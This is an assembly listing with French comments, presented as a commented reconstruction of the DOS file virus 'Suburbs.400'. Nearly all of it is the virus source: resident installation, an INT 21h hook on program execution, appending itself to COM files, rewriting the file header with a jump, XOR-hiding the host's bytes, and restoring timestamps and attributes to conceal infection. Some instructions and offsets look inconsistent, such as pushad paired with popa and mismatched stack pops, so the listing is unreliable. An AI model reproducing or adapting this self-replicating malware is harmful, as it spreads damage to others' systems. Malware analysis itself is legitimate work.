; ============================================================================
; Virus.DOS.Suburbs.400 - Analyse commentée
; ============================================================================
; Fichier original : Virus.DOS.Suburbs.400
; Taille du code viral : 400 octets (0x190)
; Type : Virus résident (TSR) infector de fichiers COM (ignore les EXE)
; Auteur probable signature : [VD/SLAM]
; Nom interne : "Suburbs"
;
; Ce fichier est une reconstruction propre + commentaires du corps viral.
; Le virus s'installe en mémoire (segment 0020h) et hook INT 21h.
;
; ============================================================================

.286
.model tiny
.code
org 100h

; ----------------------------------------------------------------------------
; POINT D'ENTRÉE DU DROPPEUR / VIRUS
; Au premier lancement, le virus saute vers la routine d'installation TSR.
; ----------------------------------------------------------------------------
start:
        jmp     short after_jmp1
        db      24h, 24h, 90h, 90h, 90h, 90h, 90h, 0C3h

after_jmp1:
        jmp     install_tsr             ; saute vers l'installeur résident

; ----------------------------------------------------------------------------
; HANDLER INT 24h temporaire (supprime les erreurs critiques pendant infection)
; ----------------------------------------------------------------------------
int24_handler:
        mov     al, 3
        iret

; ----------------------------------------------------------------------------
; HANDLER PRINCIPAL - Hooké sur INT 21h (seulement sur AH=4Bh = EXEC)
; ----------------------------------------------------------------------------
int21_handler:
        cmp     ah, 4Bh                 ; Exec ?
        je      do_infect
        jmp     far ptr original_int21  ; sinon, on chaîne vers l'original

do_infect:
        pusha
        push    ds
        push    es

        ; --- 1. Récupère les attributs du fichier cible (DS:DX) ---
        mov     ax, 4300h
        int     21h
        push    cx                      ; sauvegarde attributs originaux

        push    ds
        push    dx

        ; --- 2. Efface les attributs (lecture/écriture) ---
        mov     ax, 4301h
        xor     cx, cx
        int     21h

        ; --- 3. Ouvre le fichier en lecture/écriture ---
        mov     ax, 3D02h
        int     21h
        xchg    bx, ax                  ; BX = handle

        ; Place DS sur le segment résident (0020h) où le virus vit
        mov     ax, 20h
        mov     ds, ax

        mov     ds:[017Bh], bx          ; sauvegarde handle dans buffer virus

        ; --- 4. Sauvegarde et hook INT 24h (pour éviter les popups d'erreur) ---
        mov     ax, 3524h
        int     21h
        push    es
        push    bx

        mov     ax, 2524h
        mov     dx, offset int24_handler
        int     21h

        ; Restaure BX = handle
        mov     bx, ds:[017Bh]

        ; --- 5. Sauvegarde date/heure du fichier ---
        mov     ax, 5700h
        int     21h
        push    dx
        push    cx

        ; --- 6. Lit les 3 premiers octets du fichier (header COM) ---
        mov     ah, 3Fh
        mov     dx, 017Bh
        mov     cx, 3
        int     21h
        jnc     read_ok
        jmp     restore_and_exit

read_ok:
        ; --- 7. Si c'est un EXE (MZ ou ZM), on ne l'infecte PAS ---
        cmp     word ptr ds:[017Bh], 5A4Dh   ; 'MZ' (little endian)
        je      restore_and_exit
        cmp     word ptr ds:[017Bh], 4D5Ah   ; 'ZM'
        je      restore_and_exit

        ; --- 8. Lit 3 octets à (offset contenu dans les 2e/3e octets + 3)
        ;     Cela sert à vérifier si déjà infecté (présence de E9) ---
        mov     ax, 4200h
        xor     cx, cx
        mov     dx, ds:[017Ch]
        add     dx, 3
        int     21h

        mov     ah, 3Fh
        mov     dx, 0192h
        mov     cx, 3
        int     21h

        ; Déjà infecté si le premier octet lu est E9 ?
        cmp     byte ptr ds:[0192h], 0E9h
        je      restore_and_exit

        ; --------------------------------------------------------------------
        ; MÉCANISME CLÉ : STOCKAGE DES 3 OCTETS ORIGINAUX DE L'HÔTE
        ; --------------------------------------------------------------------
        ; On chiffre les 3 octets originaux (lus dans [017Bh]) avec XOR
        ; puis on va écrire tout le corps viral (qui contient ces octets)
        ; à la fin du fichier.
        ;
        ; Plus tard, quand le virus s'exécute dans la victime, il déchiffre
        ; ces mêmes octets et les remet à l'adresse 100h avant de rendre
        ; la main à l'hôte.
        ; --------------------------------------------------------------------
        xor     byte ptr ds:[017Bh], 21h
        xor     byte ptr ds:[017Ch], 85h
        xor     byte ptr ds:[017Dh], 2Dh

        ; --- 9. Se positionne en FIN de fichier ---
        mov     ax, 4202h
        xor     cx, cx
        xor     dx, dx
        int     21h
        mov     bp, ax                  ; BP = taille originale du fichier

        ; --- 10. Écrit les 400 octets du virus à la fin ---
        mov     ah, 40h
        xor     dx, dx                  ; écrit depuis DS:0000 (corps viral)
        mov     cx, 0190h
        int     21h
        jc      restore_and_exit        ; erreur -> on abandonne

        ; --- 11. Écrit le saut E9 au DÉBUT du fichier ---
        ;       E9 + (taille_originale - 3)
        mov     ax, 4200h
        xor     cx, cx
        xor     dx, dx
        int     21h

        mov     si, 0191h
        mov     byte ptr ds:[0191h], 0E9h
        mov     ax, bp
        sub     ax, 3
        mov     ds:[0192h], ax          ; delta = taille - 3

        mov     dx, 0191h
        mov     ah, 40h
        mov     cx, 3
        int     21h

restore_and_exit:
        ; --- Restauration date/heure ---
        mov     ax, 5701h
        pop     cx
        pop     dx
        int     21h

        ; --- Ferme le fichier ---
        mov     ah, 3Eh
        int     21h

        ; --- Restaure INT 24h ---
        pop     dx
        pop     ds
        mov     ax, 2524h
        int     21h

        ; --- Restaure les attributs ---
        mov     ax, 4301h
        pop     dx
        pop     ds
        pop     cx
        int     21h

        pop     es
        pop     ds
        popa

        ; --- Chaîne vers le handler original (far jump patché dynamiquement) ---
original_int21:
        jmp     far ptr 0000:0000       ; <-- adresse patchée à l'installation

; ============================================================================
; ROUTINE D'INSTALLATION RÉSIDENTE (TSR)
; ============================================================================
install_tsr:
        pushad
        push    ds
        push    es

        mov     di, ds                  ; sauvegarde DS courant

        ; Passe en segment résident 0020h
        mov     ax, 20h
        mov     ds, ax
        cmp     word ptr ds:[0], 0      ; déjà installé ?
        jne     already_resident

        ; Restaure DS = segment du dropper
        mov     ds, di

        ; Sauvegarde l'ancien vecteur INT 21h (0000:0084)
        xor     ax, ax
        mov     es, ax
        mov     di, 84h
        mov     ax, es:[di]
        mov     bx, es:[di+2]

        ; Calcule l'adresse du jmp far à l'intérieur du virus
        ; (l'offset 01F5h relatif au début du virus)
        mov     si, ds:[0101h]          ; valeur de "word_10001" ou base
        add     si, 01F5h
        mov     cs:[si], ax             ; patche l'adresse dans le jmp far
        mov     cs:[si+2], bx

        ; Copie 0x190 octets du corps viral vers le segment 0020h
        xor     ax, ax
        mov     di, ax
        mov     si, ds:[0101h]
        add     si, 0103h               ; début du code à copier
        push    cs
        pop     ds
        mov     ax, 20h
        mov     es, ax
        mov     cx, 0190h
        rep     movsb

        ; Installe le hook INT 21h -> 0020:0006
        xor     ax, ax
        mov     es, ax
        mov     di, 84h
        mov     word ptr es:[di], 0006h
        mov     ax, 20h
        mov     es:[di+2], ax

already_resident:
        ; Prépare DS/ES sur le segment courant
        mov     ax, cs
        mov     ds, ax
        mov     es, ax

        ; --------------------------------------------------------------------
        ; DÉCHIFFREMENT DES 3 OCTETS ORIGINAUX DE L'HÔTE
        ; --------------------------------------------------------------------
        ; L'offset 027Eh pointe (dans l'image virale) vers l'endroit où
        ; les 3 octets originaux (chiffrés) ont été stockés pendant l'infection.
        ;
        ; On les déchiffre avec les mêmes clés, puis on les copie à 100h.
        ; --------------------------------------------------------------------
        mov     si, ds:[0101h]
        add     si, 027Eh

        xor     byte ptr [si], 21h
        xor     byte ptr [si+1], 85h
        xor     byte ptr [si+2], 2Dh

        ; Copie les 3 octets déchiffrés vers 0100h (début du programme hôte)
        mov     di, 0100h
        mov     cx, 3
        rep     movsb

        pop     es
        pop     ds
        popa

        ; Rend la main au programme hôte propre (maintenant restauré à 100h)
        push    0100h
        ret

; ----------------------------------------------------------------------------
; DONNÉES / SIGNATURES (non exécutées)
; ----------------------------------------------------------------------------
        db      0B1h, 15h, 0BDh, 5Bh, 56h, 44h, 2Fh, 53h
        db      4Ch, 41h, 4Dh, 5Dh, 00h
signature:
        db      'Suburbs', 0

end start
